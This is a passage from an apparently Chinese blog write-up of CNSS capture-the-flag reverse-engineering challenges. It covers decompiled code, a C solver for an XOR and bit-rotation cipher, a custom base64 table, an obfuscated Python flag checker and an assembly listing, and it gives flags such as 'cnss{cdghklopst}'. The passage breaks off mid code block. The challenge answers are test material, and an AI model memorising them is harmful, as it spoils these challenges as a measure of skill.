class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+2Eh] [rbp-2h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+2Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v5 = (*a1 &lt;&lt; <span class="number">7</span>) | (*a2 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  v6 = ((*a4 &gt;&gt; <span class="number">2</span>) | (*a3 &lt;&lt; <span class="number">6</span>)) ^ v5;</span><br><span class="line">  v7 = ((*a1 &gt;&gt; <span class="number">1</span>) | (*a2 &lt;&lt; <span class="number">7</span>)) ^ v6;</span><br><span class="line">  v8 = ((*a3 &gt;&gt; <span class="number">2</span>) | (*a4 &lt;&lt; <span class="number">6</span>)) ^ v7;</span><br><span class="line">  *a1 = v5;</span><br><span class="line">  *a2 = v6;</span><br><span class="line">  *a3 = v7;</span><br><span class="line">  result = a4;</span><br><span class="line">  *a4 = v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了半天了不太会，去掉异或之后其他的不知道怎么做了</p>
<p>搜了一下发现这好像是往年题，做法是把异或去掉后，根据a1 a2 a3 a4的顺序倒着做一遍就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c[] = &#123;</span><br><span class="line">	<span class="number">63</span>,<span class="number">143</span>,<span class="number">163</span>,<span class="number">188</span>,<span class="number">141</span>,<span class="number">39</span>,<span class="number">122</span>,<span class="number">103</span>,<span class="number">226</span>,<span class="number">3</span>,<span class="number">162</span>,<span class="number">224</span>,</span><br><span class="line">		  <span class="number">172</span>,<span class="number">234</span>,<span class="number">149</span>,<span class="number">139</span>,<span class="number">163</span>,<span class="number">237</span>,<span class="number">204</span>,<span class="number">182</span>,<span class="number">50</span>,<span class="number">140</span>,<span class="number">148</span>,<span class="number">82</span>,</span><br><span class="line">		  <span class="number">130</span>,<span class="number">138</span>,<span class="number">20</span>,<span class="number">198</span>,<span class="number">245</span>,<span class="number">174</span>,<span class="number">104</span>,<span class="number">115</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">28</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		c[i + <span class="number">3</span>] ^= c[i + <span class="number">2</span>];</span><br><span class="line">		c[i + <span class="number">2</span>] ^= c[i + <span class="number">1</span>];</span><br><span class="line">		c[i + <span class="number">1</span>] ^= c[i + <span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> p[<span class="number">4</span>];</span><br><span class="line">		p[<span class="number">0</span>] = ((c[i + <span class="number">2</span>] &amp; <span class="number">127</span>) &lt;&lt; <span class="number">1</span>) | (c[i] &gt;&gt; <span class="number">7</span>);</span><br><span class="line">		p[<span class="number">1</span>] = ((c[i] &amp; <span class="number">127</span>) &lt;&lt; <span class="number">1</span>) | (c[i + <span class="number">2</span>] &gt;&gt; <span class="number">7</span>);</span><br><span class="line">		p[<span class="number">2</span>] = ((c[i + <span class="number">3</span>] &amp; <span class="number">63</span>) &lt;&lt; <span class="number">2</span>) | (c[i + <span class="number">1</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">		p[<span class="number">3</span>] = ((c[i + <span class="number">1</span>] &amp; <span class="number">63</span>) &lt;&lt; <span class="number">2</span>) | (c[i + <span class="number">3</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">			c[i + j] = p[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">		<span class="built_in">putchar</span>(c[i] ^ <span class="number">17</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Easy-邪王真眼"><a href="#Easy-邪王真眼" class="headerlink" title="[Easy] 邪王真眼"></a>[Easy] 邪王真眼</h2><p>encode 3和4 然后还有一个alpha的索引表，应该是base64 然后替换了索引表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, _BYTE *a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [rsp+70h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v13 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">3</span> )</span><br><span class="line">    v12 = <span class="number">3</span> - a2 % <span class="number">3</span>;</span><br><span class="line">  v9 = a2 + v12;</span><br><span class="line">  v8 = <span class="number">8</span> * (a2 + v12) / <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 = alpha[*v13 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( a2 + v12 - <span class="number">3</span> == i &amp;&amp; v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64);</span><br><span class="line">        a3[<span class="number">1</span>] = alpha[v5 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">0</span>i64, <span class="number">4</span>i64)];</span><br><span class="line">        a3[<span class="number">2</span>] = alpha[(<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">4</span>i64, <span class="number">2</span>i64)];</span><br><span class="line">        a3[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        a3[<span class="number">1</span>] = alpha[(<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64)];</span><br><span class="line">        a3[<span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">        a3[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)*v13, <span class="number">6</span>i64, <span class="number">2</span>i64);</span><br><span class="line">      a3[<span class="number">1</span>] = alpha[v6 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">0</span>i64, <span class="number">4</span>i64)];</span><br><span class="line">      v7 = (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">1</span>], <span class="number">4</span>i64, <span class="number">2</span>i64);</span><br><span class="line">      a3[<span class="number">2</span>] = alpha[v7 + (<span class="type">char</span>)cmove_bits((<span class="type">unsigned</span> __int8)v13[<span class="number">2</span>], <span class="number">0</span>i64, <span class="number">6</span>i64)];</span><br><span class="line">      a3[<span class="number">3</span>] = alpha[v13[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    a3 += <span class="number">4</span>;</span><br><span class="line">    v13 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    *a4 = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用这个网站<a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex%E6%8A%8Aalpha%E7%B4%A2%E5%BC%95%E8%A1%A8%E5%8A%A0%E4%B8%8A%E5%8E%BB%EF%BC%8C%E8%A7%A3%E5%AF%86UR3oWS5E0G03tRibWRrR0cEx%E6%8B%BF%E5%88%B0flag">http://web.chacuo.net/netbasex把alpha索引表加上去，解密UR3oWS5E0G03tRibWRrR0cEx拿到flag</a></p>
<h2 id="Mid-恭喜你获得了flag提现机会！"><a href="#Mid-恭喜你获得了flag提现机会！" class="headerlink" title="[Mid] 恭喜你获得了flag提现机会！"></a>[Mid] 恭喜你获得了flag提现机会！</h2><p>ida中patch program修改然后直接call outputflag就拿到flag了</p>
<h2 id="Mid-Pyfuck"><a href="#Mid-Pyfuck" class="headerlink" title="[Mid] Pyfuck"></a>[Mid] Pyfuck</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = [~((((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~(((((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~(((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~(((~((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))]</span><br><span class="line">flag = input(&quot;flag: &quot;)</span><br><span class="line">if len(flag) == 31:</span><br><span class="line">	for i in range(len(flag)):</span><br><span class="line">		if (ord(flag[i])^((~((~(((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))!=x[i]:</span><br><span class="line">			print(&quot;Wrong&quot;)</span><br><span class="line">			exit()</span><br><span class="line">	print(&quot;Correct&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;Wrong&quot;)</span><br></pre></td></tr></table></figure>

<p>这个挺有意思的[]&lt;[]产生一个0然后用各种位运算。只需要x[]异或上if判断中的</p>
<p>((<del>((</del>(((-<del>([]&lt;[]))&lt;&lt;(-</del>([]&lt;[]))))&lt;&lt;(-<del>([]&lt;[]))))&lt;&lt;(-</del>([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))然后chr输出就拿到flag了</p>
<h2 id="Mid-diannaobaozhale"><a href="#Mid-diannaobaozhale" class="headerlink" title="[Mid] diannaobaozhale"></a>[Mid] diannaobaozhale</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">main            proc near</span><br><span class="line"></span><br><span class="line">var_5           = byte ptr -5</span><br><span class="line">var_4           = dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">        endbr64</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 10h</span><br><span class="line">        mov     [rbp+var_5], 63</span><br><span class="line">        mov     edi, 63h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 6Eh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 73h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 73h</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     edi, 7Bh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     [rbp+var_4], 0</span><br><span class="line">        jmp     short loc_11B0</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_1194:</span><br><span class="line">        movsx   eax, [rbp+var_5]</span><br><span class="line">        mov     edi, eax        ;</span><br><span class="line">        call    _putchar</span><br><span class="line">        movzx   eax, [rbp+var_5]</span><br><span class="line">        add     eax, 2</span><br><span class="line">        xor     eax, 1</span><br><span class="line">        mov     [rbp+var_5], al</span><br><span class="line">        add     [rbp+var_4], 1</span><br><span class="line"></span><br><span class="line">loc_11B0:</span><br><span class="line">        cmp     [rbp+var_4], 9</span><br><span class="line">        jle     short loc_1194</span><br><span class="line">        mov     edi, 7Dh</span><br><span class="line">        call    _putchar</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        retn</span><br><span class="line">; &#125;</span><br><span class="line">main            endp</span><br></pre></td></tr></table></figure>

<p>__putchar输出字符</p>
<p>63h 6Eh 73h 73h 7Bh 对应cnss{ </p>
<p>cmp  [rbp+var_4], 9 jle     short loc_1194以及add     [rbp+var_4], 1</p>
<p>就是一个九次的循环</p>
<p>7Dh对应 }</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">	<span class="type">char</span> rbpvar5 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">putchar</span>(rbpvar5);</span><br><span class="line">		rbpvar5 += <span class="number">2</span>; rbpvar5 ^= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag cnss{cdghklopst}</p>
<h2 id="Hard-Shino-的心跳大冒险"><a href="#Hard-Shino-的心跳大冒险" class="headerlink" title="[Hard] Shino 的心跳大冒险"></a>[Hard] Shino 的心跳大冒险</h2><p>玩了一下发现flag被挡住了，看目录里面有好几个Yuri关键词，搜索了一下发现</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rinkako/YuriAVGEngine%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE">https://github.com/rinkako/YuriAVGEngine这个项目</a></p>
<p>看了下简洁这个游戏引擎是基于虚拟机的，有个main.sil是存放游戏逻辑的中间码的，但是被加密了，像是base64加密，用在线的base64解密发现乱码</p>
<p>继续翻项目，发现有个yuriricli是用来编译项目的，下载源码看看里面是怎么加密的</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 